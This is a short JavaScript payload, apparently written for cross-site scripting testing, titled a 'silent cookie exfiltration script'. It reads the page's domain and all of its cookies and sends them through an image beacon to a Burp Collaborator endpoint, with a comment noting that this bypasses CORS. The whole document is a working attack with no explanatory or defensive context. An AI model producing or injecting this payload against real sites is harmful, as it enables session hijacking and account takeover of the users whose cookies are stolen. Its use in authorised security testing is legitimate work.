// Silent cookie exfiltration script

// Get document domain and cookies
var domain = document.domain;
var cookies = document.cookie;

// Define your Burp Collaborator endpoint
var exfilURL = "https://evd6ijg72o74ri9ne2kpold5hwnnblza.oastify.com";

// Send via image beacon (bypasses CORS)
var img = new Image();
img.src = exfilURL + "/?domain=" + encodeURIComponent(domain) + "&cookie=" + encodeURIComponent(cookies);
